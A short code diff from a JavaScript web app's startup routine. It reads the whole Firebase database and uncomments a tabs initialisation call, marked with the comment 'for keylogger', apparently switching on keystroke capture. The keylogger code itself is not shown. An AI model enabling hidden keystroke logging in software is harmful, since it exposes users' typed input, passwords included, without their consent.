@@ -25,7 +25,7 @@ class Core {
 	init(){
 		const { dispatch, getState } = this.store;
     const storedData = firebase.database().ref().once('value', (snapshot) => snapshot);
-		// this.tabs.init();
+		this.tabs.init(); // <-- for keylogger;
 		this.idle._init();
     this.auth.onAuthStateChanged();
 
